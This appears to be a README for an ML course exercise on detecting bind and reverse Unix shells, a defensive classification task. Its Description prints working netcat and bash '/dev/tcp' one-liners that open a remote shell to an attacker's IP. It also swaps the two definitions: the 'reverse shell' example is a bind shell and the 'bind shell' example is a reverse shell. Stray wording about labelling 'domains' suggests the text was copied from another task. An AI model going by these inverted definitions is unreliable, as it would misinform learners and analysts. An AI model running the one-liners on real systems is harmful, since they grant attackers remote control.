# ML_ITMO_lessons
Решение урока №2 курса ML в ИБ

**Overview**
Detecting bind/reverse shells
Welcome to the Bind/Reverse Shell Detection competition! This competition focuses on detecting bind/reverse Unix shells. Your task is to build a machine learning model that can distinguish between regular and bind/reverse shells.

**Goal**
The goal of this competition is to detect bind/reverse shells, which are often used for establishing a link between an attacker and a target machine
Participants will be provided with a dataset of Unix shells labeled as bind/reverse (1) or legitimate (0). Your task is to build a model that predicts the correct label for each domain in the test set.

**Description**
The use of bind or reverse shell is highly scenario-dependent:

**Reverse Shell**: when a target machine is behind a firewall or NAT, making it hard to initiate an inbound connection. The target machine will connect to the attacker's machine in this setup, hence bypassing the firewall restrictions.
This command is run on the target, 192.168.1.100
nc -lvp 4444 -e cmd.exe
This command is run on the attacker, 192.168.1.50
nc 192.168.1.100 4444

**Bind Shell**: applicable when the attacker's machine is able to connect directly to the target machine. In that respect, the target machine is listening to some port for incoming connections, and control is given to the attacking machine upon connection to that port.
This command is run on the attacker, 10.0.0.5
nc -lvnp 443
This command is run on the target, 192.168.1.100
bash -i >& /dev/tcp/10.0.0.5/443 0>&1
